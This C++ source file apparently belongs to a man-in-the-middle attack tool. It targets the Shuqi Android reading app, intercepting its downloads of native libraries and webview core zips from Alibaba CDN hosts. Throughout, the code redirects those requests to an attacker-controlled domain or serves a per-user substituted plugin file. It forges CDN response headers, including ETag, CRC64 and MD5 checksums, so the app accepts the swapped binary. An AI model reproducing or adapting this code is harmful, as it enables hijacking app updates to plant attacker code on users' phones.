
#include <windows.h>
#include "ShuqiPlugin.h"
#include "PluginServer.h"
#include "../attacker.h"
#include <stdio.h>
#include "../cipher/CryptoUtils.h"
#include "../cipher/Base64.h"
#include "PluginServer.h"
#include "../Public.h"
#include "../attack.h"
#include "../HttpUtils.h"
#include "../HttpPartial.h"
#include "../FileOper.h"

int gShuqiFlag = 0;
//int mode = 0;


//appdownload.alicdn.com/bundle/3dfef6527b0b7517fe90b3e5e658c9e8/libcom_shuqi_controller_voiceiflytek.so
//appdownload.alicdn.com/bundle/128db763528dafed70f23e062012ada3/libcom_shuqi_controller_weex.so
//appdownload.alicdn.com/bundle/8692c033e44e4583818034b937b64f42/libcom_shuqi_controller_voiceidst.so

int ShuqiPlugin::isShuqi(string url, string host) {
	if (strstr(host.c_str(), "appdownload.alicdn.com") == FALSE) {
		return FALSE;
	}

	if (strstr(url.c_str(), "/bundle/") && strstr(url.c_str(), "/libcom_shuqi_controller_weex.so") )
	{
		return TRUE;
	}

	return FALSE;
}


int ShuqiPlugin::shuqiRedirection(char * lpbuf, int bufsize, int limit, LPSSLPROXYPARAM lpssl) {
	char *szformat = "HTTP/1.1 302 Found\r\n"
		"Content-Type: text/plain; charset=utf-8\r\n"
		"Content-Length: 0\r\n"
		"Connection: keep-alive\r\n"
		"Location: http://%s/%s\r\n\r\n";

	string strip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + lpssl->username;

	int totallen = 0;

	totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), "libcom_shuqi_controller_weex.so");

	return totallen;
}

int ShuqiPlugin::replyShuqi(char*recvBuffer, int len, int buflimit, LPSSLPROXYPARAM lpssl) {

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/zip\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpssl->username, "libcom_shuqi_controller_weex.so");
	int ret = HttpPartial::AliCdnPartialFile(filename.c_str(), lpssl, 0, -1);
	return ret;
}





int ShuqiPlugin::isShuqiHead(const char * url, const char * host) {
	if (strstr(host, "oss-asq-download.11222.cn") == FALSE) {
		return FALSE;
	}

	if (memcmp(url, "HEAD /", 6) )
	{
		return FALSE;
	}


	if (strstr(url, "/shuqi_android/webview_core_libs_") && strstr(url, ".zip"))
	{
		return 1;
	}

	return FALSE;
}



int ShuqiPlugin::isShuqiRequest(const char * url, const char * host) {
	if (strstr(host, "oss-asq-download.11222.cn") == FALSE) {
		return FALSE;
	}
	if (strstr(url, "/shuqi_android/webview_core_libs_") && strstr(url, ".zip"))
	{
		return 1;
	}

	return FALSE;
}



int ShuqiPlugin::makeShuqiRequestReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {

	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Length: %u\r\n"
		"x-oss-request-id: 5BED327350EBE3D50CB4E734\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-storage-class: Standard\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-server-time: 86400\r\n"
		//"Via: cache5.l2cm12[0,304-0,H], cache18.l2cm12[0,0], cache4.cn674[0,200-0,H], cache4.cn674[1,0]\r\n"
		//"Ali-Swift-Global-Savetime: 1549553692\r\n"
		"Age: 86400\r\n"
		//"X-Cache: HIT TCP_MEM_HIT dirn:4:204530276\r\n"
		//"X-Swift-SaveTime: Wed, 20 Feb 2019 00:36:19 GMT\r\n"
		"X-Swift-CacheTime: 3600\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 73e7e49a15422778872358665e\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n%s";
	string contentlen = "Content-Length: %u\r\n\r\n";

	int ret = 0;

	string urlfilename =  string(lpssl->username) + "/" + SHUQI_PLUGIN_ZIP_FILENAME;
	string filename = Public::getUserPluginPath(lpssl->username) + SHUQI_PLUGIN_ZIP_FILENAME;

	ret = FileOper::fileDecryptWriter(filename, filename);

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpFormat, szmd5, crc64.c_str(), szmd5, szbase64md5, contentlen.c_str());
	//filesize is not filled

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lpssl, hdrformat, 1);

	return httphdrlen;
}

int ShuqiPlugin::makeShuqiHeadReply(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {

	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		//"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-request-id: 5BED327350EBE3D50CB4E734\r\n"
		"x-oss-storage-class: Standard\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-server-time: 86400\r\n"
		//"Via: cache5.l2cm12[0,304-0,H], cache18.l2cm12[0,0], cache4.cn674[0,200-0,H], cache4.cn674[1,0]\r\n"
		//"Ali-Swift-Global-Savetime: 1549553692\r\n"
		"Age: 86400\r\n"
		//"X-Cache: HIT TCP_MEM_HIT dirn:4:204530276\r\n"
		//"X-Swift-SaveTime: Wed, 20 Feb 2019 00:36:19 GMT\r\n"
		"X-Swift-CacheTime: 3600\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 73e7e49a15422778873491229e\r\n"
		"ETag: \"%s\"\r\n"
 		"x-oss-hash-crc64ecma: %s\r\n"
 		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = "";

	filename = Public::getUserPluginPath(lpssl->username) + SHUQI_PLUGIN_ZIP_FILENAME;

	ret = FileOper::fileDecryptWriter(filename, filename);
	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	int httphdrlen = sprintf_s(dstbuf, dstbuflimit, szHttpFormat, szmd5, crc64.c_str(), szmd5, szbase64md5, filesize);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn header:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return httphdrlen;
}

// int ShuqiPlugin::makeRedirection(char * lpbuf, int bufsize, int limit, LPHTTPPROXYPARAM lpssl) {
// 	char *szformat = "HTTP/1.1 302 Found\r\n"
// 		"Content-Type: text/plain; charset=utf-8\r\n"
// 		"Content-Length: 0\r\n"
// 		"Connection: keep-alive\r\n"
// 		"Location: http://%s/%s\r\n\r\n";
// 
// 	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
// 
// 	int totallen = 0;
// 
// 	totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), SHUQI_PLUGIN_ZIP_FILENAME);
// 
// 	return totallen;
// }
// 
// int ShuqiPlugin::makeRedirection(char * lpbuf, int bufsize, int limit, LPSSLPROXYPARAM lpssl) {
// 	char *szformat = "HTTP/1.1 302 Found\r\n"
// 		"Content-Type: text/plain; charset=utf-8\r\n"
// 		"Content-Length: 0\r\n"
// 		"Connection: keep-alive\r\n"
// 		"Location: http://%s/%s\r\n\r\n";
// 
// 	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
// 
// 	int totallen = 0;
// 
// 	totallen = sprintf_s(lpbuf, limit, szformat, strip.c_str(), SHUQI_PLUGIN_ZIP_FILENAME);
// 
// 	return totallen;
// }

int ShuqiPlugin::makeShuqiRequestReply(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Length: %u\r\n"
		"x-oss-request-id: 5BED327350EBE3D50CB4E734\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-storage-class: Standard\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-server-time: 86400\r\n"
		//"Via: cache5.l2cm12[0,304-0,H], cache18.l2cm12[0,0], cache4.cn674[0,200-0,H], cache4.cn674[1,0]\r\n"
		//"Ali-Swift-Global-Savetime: 1549553692\r\n"
		"Age: 86400\r\n"
		//"X-Cache: HIT TCP_MEM_HIT dirn:4:204530276\r\n"
		//"X-Swift-SaveTime: Wed, 20 Feb 2019 00:36:19 GMT\r\n"
		"X-Swift-CacheTime: 3600\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 73e7e49a15422778872358665e\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n%s";
	string contentlen = "Content-Length: %u\r\n\r\n";

	int ret = 0;

	string urlfilename = string(lphttp->username) + "/" + SHUQI_PLUGIN_ZIP_FILENAME;
	string filename = Public::getUserPluginPath(lphttp->username) + SHUQI_PLUGIN_ZIP_FILENAME;

	ret = FileOper::fileDecryptWriter(filename, filename);
	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char hdrformat[4096];
	int httphdrlen = sprintf_s(hdrformat, 4096, szHttpFormat, szmd5, crc64.c_str(), szmd5, szbase64md5, contentlen.c_str());
	//filesize is not filled

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn reply:%s\r\n", hdrformat);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	ret = PluginServer::SendPluginFile(urlfilename.c_str(), lphttp, hdrformat, 1);

	return httphdrlen;
}

int ShuqiPlugin::makeShuqiHeadReply(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {


		char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		//"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"x-oss-request-id: 5BED327350EBE3D50CB4E734\r\n"
		"x-oss-storage-class: Standard\r\n"
		"x-oss-object-type: Normal\r\n"
		"x-oss-server-time: 86400\r\n"
		//"Via: cache5.l2cm12[0,304-0,H], cache18.l2cm12[0,0], cache4.cn674[0,200-0,H], cache4.cn674[1,0]\r\n"
		//"Ali-Swift-Global-Savetime: 1549553692\r\n"
		"Age: 86400\r\n"
		//"X-Cache: HIT TCP_MEM_HIT dirn:4:204530276\r\n"
		//"X-Swift-SaveTime: Wed, 20 Feb 2019 00:36:19 GMT\r\n"
		"X-Swift-CacheTime: 3600\r\n"
		"Timing-Allow-Origin: *\r\n"
		"EagleId: 73e7e49a15422778873491229e\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = "";

	filename = Public::getUserPluginPath(lphttp->username) + SHUQI_PLUGIN_ZIP_FILENAME;

	ret = FileOper::fileDecryptWriter(filename, filename);
	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	int httphdrlen = sprintf_s(dstbuf, dstbuflimit, szHttpFormat, szmd5, crc64.c_str(), szmd5, szbase64md5, filesize);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "alicdn header:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return httphdrlen;
}


/*
HEAD /shuqi_android/webview_core_libs_2.1.zip HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; MIX 2S MIUI/V10.2.1.0.PDGCNXM)
Host: oss-asq-download.11222.cn
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/zip
Content-Length: 15970864
Connection: keep-alive
Date: Wed, 20 Feb 2019 00:04:30 GMT
x-oss-request-id: 5C6C998E9244127CA705835E
Accept-Ranges: bytes
ETag: "BCBC3396EA1746F984E0654DC0955AA8"
Last-Modified: Fri, 11 Aug 2017 10:26:31 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 1095444200657573383
x-oss-storage-class: Standard
Content-MD5: vLwzluoXRvmE4GVNwJVaqA==
x-oss-server-time: 66
Via: cache5.l2cm12[0,304-0,H], cache18.l2cm12[0,0], cache4.cn674[0,200-0,H], cache4.cn674[1,0]
Ali-Swift-Global-Savetime: 1549553692
Age: 4249
X-Cache: HIT TCP_MEM_HIT dirn:4:204530276
X-Swift-SaveTime: Wed, 20 Feb 2019 00:36:19 GMT
X-Swift-CacheTime: 3600
Timing-Allow-Origin: *
EagleId: 7af6091815506253197736672e
*/
